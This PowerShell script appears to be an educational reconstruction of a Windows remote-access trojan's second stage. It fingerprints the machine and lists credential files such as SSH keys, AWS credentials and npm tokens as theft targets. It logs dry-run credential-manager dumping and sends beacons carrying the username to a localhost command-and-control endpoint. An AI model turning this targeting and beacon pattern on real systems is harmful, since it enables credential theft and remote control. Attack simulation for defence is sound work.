# payloads/windows.ps1
#
# DEMO RECONSTRUCTION — Windows second-stage payload simulation
#
# In the real attack, a VBScript fetched and executed this PowerShell RAT.
# The PowerShell binary was disguised as Windows Terminal (wt.exe) in %PROGRAMDATA%.
#
# This simulation logs what each stage would do instead of executing it.

$C2Host = "localhost"
$C2Port = 3000
$BeaconInterval = 60

function Write-RAT {
    param([string]$msg)
    Write-Host "[Windows RAT] $(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ') $msg"
}

# ── PHASE 1: System fingerprinting ───────────────────────────────────────────
Write-RAT "Fingerprinting system..."
Write-RAT "  hostname:  $env:COMPUTERNAME"
Write-RAT "  user:      $env:USERNAME"
Write-RAT "  domain:    $env:USERDOMAIN"
Write-RAT "  os:        $([System.Environment]::OSVersion.VersionString)"

# ── PHASE 2: Credential enumeration ─────────────────────────────────────────
# Real RAT would read and exfiltrate these
$HighValuePaths = @(
    "$env:USERPROFILE\.ssh",
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.npmrc",
    "$env:APPDATA\Roaming\Code\User\settings.json",  # VS Code settings (often has tokens)
    "$env:USERPROFILE\.gitconfig"
)

Write-RAT "Enumerating high-value paths..."
foreach ($path in $HighValuePaths) {
    if (Test-Path $path) {
        Write-RAT "  [FOUND] $path — would exfiltrate"
    } else {
        Write-RAT "  [NOT FOUND] $path"
    }
}

# ── PHASE 3: Windows Credential Manager dump simulation ───────────────────────
Write-RAT "Simulating Windows Credential Manager enumeration..."
Write-RAT "  [DRY RUN] Would run: cmdkey /list"
Write-RAT "  [DRY RUN] Would enumerate DPAPI-protected blobs"

# ── PHASE 4: C2 beacon loop ──────────────────────────────────────────────────
Write-RAT "Starting beacon loop (every ${BeaconInterval}s) → ${C2Host}:${C2Port}/beacon"

for ($i = 1; $i -le 3; $i++) {
    Write-RAT "Beacon #${i} → POST http://${C2Host}:${C2Port}/beacon"
    try {
        $body = @{ os = "Windows"; user = $env:USERNAME; beacon = $i } | ConvertTo-Json
        $response = Invoke-RestMethod `
            -Uri "http://${C2Host}:${C2Port}/beacon" `
            -Method POST `
            -Body $body `
            -ContentType "application/json" `
            -ErrorAction Stop
        Write-RAT "Beacon #${i} acknowledged: $response"
    } catch {
        Write-RAT "Beacon #${i} failed (C2 unreachable): $_"
    }
    Start-Sleep -Seconds $BeaconInterval
}

Write-RAT "Demo complete. In a real attack this loop would run indefinitely."
